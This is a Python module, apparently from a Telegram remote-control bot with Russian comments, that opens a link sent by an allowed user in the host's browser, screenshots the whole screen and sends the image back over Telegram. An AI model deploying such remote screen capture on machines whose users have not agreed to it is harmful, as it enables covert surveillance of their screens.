##  _________________________________________
##   |_______  authors: Eks1azy     _______|
##    \_\_\_|______  Oqwe4O  _______|\_\_\_\
##    \_\_\_|______  Tusay1  _______|\_\_\_\
##           \_\_\_\_\_\_\_\_\_\_\_\
##   ___________________________________________
##  |                                          /\
##  |  github:https://github.com/Eks1azy      / /
##  |                                        / /
##  |    if you will find some bugs or      / /
##  |                                      / /
##  |    have ideas for improvements,     / /
##  |                                    / /
##  |       please send it to me        / /
##  |__________________________________/ /
##  \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_/



from aiogram import types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.types import FSInputFile
from config import ALLOWED_USER_ID, directory, bot
from lib.states import url

import webbrowser
import asyncio
import pyautogui
import os

def register_open_url(dp):
    @dp.message(F.text.lower() == "открыть ссылку")
    @dp.message(Command("open_url"))
    async def open_url(message: types.Message, state: FSMContext):
        if message.from_user.id == ALLOWED_USER_ID:

            await message.answer("Ок, кидай ссылку.")
            await state.set_state(url.waiting_url)
        else:
            await message.answer("К сожалению, у вас нет доступа к этому боту.")

    @dp.message(url.waiting_url)
    async def open_url(message: types.Message, state: FSMContext):
        if message.from_user.id == ALLOWED_USER_ID:

            url = message.text
            webbrowser.open(url)


            # Задержка в 5 секунд
            await asyncio.sleep(5)
            await message.answer("Ссылка была успешно открыта:")
            # Делаем скриншот всего экрана
            screenshot = pyautogui.screenshot()
            filename = "screenshot.png"
            filepath = os.path.join(directory, filename)

            # Убедитесь, что директория существует, если нет, создайте её
            os.makedirs(directory, exist_ok=True)

            # Сохраняем скриншот в указанную директорию
            screenshot.save(filepath)

            # Создаем объект FSInputFile
            photo = FSInputFile(filepath)

            # Отправляем фото с подписью
            await message.answer_photo(photo)

            # Удаляем файл после отправки
            if os.path.exists(filepath):
                os.remove(filepath)

            async def main():
                await dp.start_polling(bot)
            await state.clear()
        else:
            await message.answer("К сожалению, у вас нет доступа к этому боту.")
